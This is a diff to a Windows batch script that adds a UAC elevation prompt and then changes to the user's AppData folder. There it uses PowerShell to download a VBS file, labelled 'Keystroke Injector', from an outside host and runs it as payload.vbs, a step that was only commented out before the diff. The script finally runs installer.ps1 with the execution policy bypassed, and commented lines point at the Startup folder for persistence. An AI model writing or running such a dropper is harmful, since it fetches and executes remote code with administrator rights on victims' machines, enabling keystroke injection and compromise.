@@ -1,35 +1,48 @@
-@REM @echo off
+@echo off
+::---------------------------------------------------------------------------------------------------------------
+::  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+:: --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
 
-@REM -------------------------------------------------------------------------------------------------------------------------------------
-:: Check for Administrator privileges
-if "%LOGONSERVER%"=="." (
-    echo This script must be run as Administrator.
-    pause
-    exit /B 1
-)
+:UACPrompt
 
-:: If not elevated, prompt for elevation
-echo Set UAC = CreateObject("Shell.Application") > elevate.vbs
-echo UAC.ShellExecute "%~nx0", "", "", "runas", 1 >> elevate.vbs
-start /wait elevate.vbs
-del elevate.vbs
-@REM -------------------------------------------------------------------------------------------------------------------------------------
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    "%temp%\getadmin.vbs"
+    ::exit /B
+
+:gotAdmin
+
+    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+::----------------------------------------------------------------------------------------------------------------
 
 SET currentDirectory=%cd%
 SET TARGETDIR="C:\Users\%username%\AppData\Roaming\"
-@REM SET TargetLocToGetFile=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-@REM SET TargetFile="%currentDirectory%\module_downloader.cmd"
+:: SET TargetLocToGetFile=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+:: SET TargetFile="%currentDirectory%\module_downloader.cmd"
 
 cd %TARGETDIR%
 
-@REM -------------------------------------------------------------------------------------------------------------------------------------
+:: -----------------------------------------------------------cmd-------------------------------------------------------------------------
 
-@REM download Keystroke Injector
+:: download Keystroke Injector
 powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/hello.vbs' -OutFile payload.vbs"
-@REM payload.vbs
+payload.vbs
 
-@REM -------------------------------------------------------------------------------------------------------------------------------------
+:: -------------------------------------------------------------------------------------------------------------------------------------
 
 cd %currentDirectory%
-@REM del module_downloader.cmd
+:: del module_downloader.cmd
+
+:: -----------------------------------------------------------ps1--------------------------------------------------------------------------
+
 powershell -ExecutionPolicy Bypass -File "%~dp0\installer.ps1"
+
+:: -------------------------------------------------------------------------------------------------------------------------------------
